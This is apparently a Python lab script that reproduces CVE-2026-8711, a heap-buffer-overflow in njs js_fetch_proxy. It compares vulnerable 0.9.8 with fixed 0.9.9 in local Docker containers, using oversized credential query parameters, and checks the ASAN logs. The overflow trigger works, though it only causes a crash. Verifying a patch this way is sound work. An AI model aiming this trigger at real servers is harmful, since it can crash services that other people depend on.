#!/usr/bin/env python3
"""Milestone runner for the CVE-2026-8711 ASAN lab.

This script only exercises the local Docker lab over HTTP and summarizes the
ASAN result from container logs.  It does not read target process memory.
"""

from __future__ import annotations

import argparse
import datetime as dt
import http.client
import subprocess
import sys
import time
import urllib.parse


class Color:
    BLUE = "\033[1;34m"
    CYAN = "\033[1;36m"
    GREEN = "\033[1;32m"
    RED = "\033[1;31m"
    YELLOW = "\033[1;33m"
    DIM = "\033[2m"
    RESET = "\033[0m"


def paint(value: str, color: str, enabled: bool) -> str:
    if not enabled:
        return value
    return f"{color}{value}{Color.RESET}"


def parse_target(value: str) -> tuple[str, int]:
    if "://" in value:
        parsed = urllib.parse.urlparse(value)
        if parsed.hostname is None or parsed.port is None:
            raise ValueError(f"target must include host and port: {value}")
        return parsed.hostname, parsed.port

    host, sep, port = value.rpartition(":")
    if sep == "":
        raise ValueError(f"target must be HOST:PORT: {value}")
    return host, int(port)


def request(host: str, port: int, path: str, timeout: float = 5.0) -> tuple[int, bytes]:
    conn = http.client.HTTPConnection(host, port, timeout=timeout)
    try:
        conn.request("GET", path)
        resp = conn.getresponse()
        body = resp.read()
        return resp.status, body
    finally:
        conn.close()


def dynamic_path(user: str, password: str) -> str:
    query = urllib.parse.urlencode({"u": user, "p": password})
    return f"/dynamic_proxy?{query}"


def healthy(host: str, port: int) -> bool:
    try:
        status, body = request(host, port, "/", timeout=2.0)
    except OSError:
        return False
    return status == 200 and b"njs fetch proxy lab ok" in body


def run_probe(label: str, target: str, length: int, color: bool) -> dict[str, object]:
    host, port = parse_target(target)
    print(paint(f"\n[{label}] {host}:{port}", Color.CYAN, color))
    print(f"  ASLR:      {paint('left enabled', Color.GREEN, color)}")
    print(f"  primitive: HTTP GET /dynamic_proxy?u=...&p=...")

    if not healthy(host, port):
        print(paint("  preflight: target unhealthy", Color.RED, color))
        return {"ok": False, "crashed": False, "status": None}

    status, body = request(host, port, dynamic_path("testuser", "testpass"))
    print(f"  benign:    HTTP {status}, {body[:72]!r}")

    user = "A" * length
    password = "B" * length
    print(f"  trigger:   username={len(user)} password={len(password)}")

    crashed = False
    trigger_status: int | None = None

    try:
        trigger_status, trigger_body = request(
            host, port, dynamic_path(user, password), timeout=3.0
        )
        sample = trigger_body[:72]
        print(f"  result:    HTTP {trigger_status}, body_len={len(trigger_body)}, {sample!r}")
    except (http.client.RemoteDisconnected, ConnectionResetError, TimeoutError, OSError) as exc:
        crashed = True
        print(paint(f"  result:    connection closed during trigger: {exc}", Color.YELLOW, color))

    time.sleep(0.4)
    alive = healthy(host, port)
    health_color = Color.GREEN if alive else Color.RED
    print(f"  recovery:  {paint('responding after trigger' if alive else 'not responding', health_color, color)}")

    return {"ok": True, "crashed": crashed, "status": trigger_status, "alive": alive}


def docker_logs(container: str, since: str) -> str:
    proc = subprocess.run(
        ["docker", "logs", "--since", since, container],
        text=True,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        check=False,
    )
    return proc.stdout


def print_asan_summary(container: str, since: str, color: bool) -> bool:
    logs = docker_logs(container, since)
    lines = logs.splitlines()
    matched = [
        line
        for line in lines
        if "ERROR: AddressSanitizer: heap-buffer-overflow" in line
        or "ngx_js_parse_proxy_url" in line
        or "ngx_unescape_uri" in line
        or "worker process" in line and "exited on signal" in line
    ]

    print(paint(f"\n[ASAN] {container}", Color.CYAN, color))
    if not matched:
        print(paint("  no ASAN heap-buffer-overflow signature in fresh logs", Color.YELLOW, color))
        return False

    for line in matched[:12]:
        out = line
        if "heap-buffer-overflow" in line:
            out = paint(out, Color.RED, color)
        elif "ngx_js_parse_proxy_url" in line or "ngx_unescape_uri" in line:
            out = paint(out, Color.YELLOW, color)
        print(f"  {out}")
    return any("heap-buffer-overflow" in line for line in matched)


def main() -> int:
    parser = argparse.ArgumentParser(
        description="CVE-2026-8711 local ASAN repro: vulnerable njs 0.9.8 vs fixed 0.9.9."
    )
    parser.add_argument("--vulnerable", default="127.0.0.1:19411", help="vulnerable lab HOST:PORT")
    parser.add_argument("--fixed", default="127.0.0.1:19421", help="fixed lab HOST:PORT")
    parser.add_argument("--vulnerable-container", default="njs-fetch-proxy-098-asan")
    parser.add_argument("--fixed-container", default="njs-fetch-proxy-099-asan")
    parser.add_argument("--length", type=int, default=512, help="raw credential length")
    parser.add_argument("--no-color", action="store_true")
    args = parser.parse_args()

    color = not args.no_color
    since = dt.datetime.now(dt.timezone.utc).isoformat(timespec="seconds")

    print(paint("CVE-2026-8711 njs js_fetch_proxy ASAN repro", Color.BLUE, color))
    print("vulnerable: njs 0.9.8")
    print("fixed:      njs 0.9.9")

    vuln = run_probe("vulnerable", args.vulnerable, args.length, color)
    fixed = run_probe("fixed", args.fixed, args.length, color)

    asan_seen = print_asan_summary(args.vulnerable_container, since, color)
    fixed_asan_seen = print_asan_summary(args.fixed_container, since, color)

    print(paint("\n[verdict]", Color.CYAN, color))
    if vuln.get("crashed") and asan_seen and fixed.get("status") == 200 and not fixed_asan_seen:
        print(paint("  reproduced: vulnerable 0.9.8 overflows; fixed 0.9.9 does not", Color.GREEN, color))
        return 0

    print(paint("  inconclusive: inspect container state and logs", Color.RED, color))
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
